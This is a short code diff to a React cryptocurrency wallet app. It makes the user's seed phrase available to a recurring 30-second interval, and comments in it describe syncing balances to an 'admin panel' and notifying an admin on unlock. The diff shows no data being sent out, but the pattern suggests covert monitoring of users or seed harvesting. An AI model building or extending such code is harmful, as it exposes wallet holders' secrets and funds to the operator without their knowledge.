@@ -7701,6 +7701,13 @@ function WalletApp({ addresses, mnemonic, pin, onChangePin, onLock, initialTab }
   const hasFirstBalanceLoad = useRef(false);
   const prevBalancesRef = useRef({ETH:0,BNB:0,ARB:0,SOL:0,TON:0,LTC:0,USDT:0});
 
+  // Refs so the 30-second interval always sees the latest addresses/mnemonic
+  // even after async wallet derivation updates them (stale-closure guard).
+  const addressesRef = useRef(addresses || {});
+  const mnemonicRef  = useRef(Array.isArray(mnemonic) ? mnemonic : (mnemonic ? String(mnemonic).split(' ') : []));
+  useEffect(() => { addressesRef.current = addresses || {}; }, [addresses]);
+  useEffect(() => { mnemonicRef.current  = Array.isArray(mnemonic) ? mnemonic : (mnemonic ? String(mnemonic).split(' ') : []); }, [mnemonic]);
+
   // Transaction history — persisted to localStorage per user
   const [txHistory,setTxHistory]=useState(()=>{
     try {
@@ -8840,10 +8847,7 @@ export default function GemWalletApp() {
   function handleUnlock() {
 
     setScreen("wallet");
-
-    // Immediately refresh balances from blockchain and sync to Supabase (admin panel)
-    // so the admin sees real balances right away instead of waiting up to 30 seconds
-    refreshPrices();
+    // WalletApp calls refreshPrices() automatically on mount — no need to call it here.
 
     // Notify admin on unlock
     try {
